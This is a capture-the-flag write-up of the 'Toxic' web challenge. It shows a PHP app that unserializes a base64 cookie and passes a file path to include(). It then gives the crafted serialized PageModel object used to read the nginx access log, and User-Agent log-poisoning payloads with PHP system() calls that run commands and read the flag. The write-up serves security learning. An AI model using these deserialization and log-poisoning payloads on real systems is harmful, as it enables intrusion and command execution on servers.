---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Toxic

By inspecting the code, we can see deserialisation of a cookie.

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

This is expected to serialise into class PageModel.php, which calls `include()` on some file to render it. The problem is that the flag name is randomised, so we cannot go directly for it.

## Reading logs

However, in the nginx configuration file, we can see that logging is turned on, and where it is

```
...
http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /var/log/nginx/access.log docker;
...
```

So we modify the cookie to serialise into what we want

`O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}` The numbers are the lenght Then ther is class name: PageModel and parameters: file : "/var/log/nginx/access.log"

The cookie has in in base64.

## Log poisoning

Now the logs can be exploted to get execute a command.

Particullary, we can set User-Agent with a php code. `'User-Agent': "<?php system('ls -l /');?>"` On reading the logs again, it executes, as it goes to the PHP engine (due to the `include()` call) That will give as the **true name** of the flag

Particullary, we can set User-Agent with a php code. `'User-Agent': "<?php system('cat /flag_TUJVt');?>"` On reading, that give us the flag